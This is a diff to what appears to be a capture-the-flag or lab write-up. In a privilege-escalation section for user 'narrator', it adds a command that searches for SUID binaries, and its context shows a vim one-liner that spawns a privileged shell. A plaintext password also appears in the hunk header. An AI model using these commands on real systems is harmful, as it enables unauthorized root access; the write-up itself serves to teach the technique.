@@ -33,6 +33,10 @@ password: X8JEETQmf3hkS65f<br/>
 
 ##### Privilege escalation of user `narrator`
 
+`find / -perm -4000 2>/dev/null`
+
+![image](images/suid.png)
+
 ```
 vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 ```
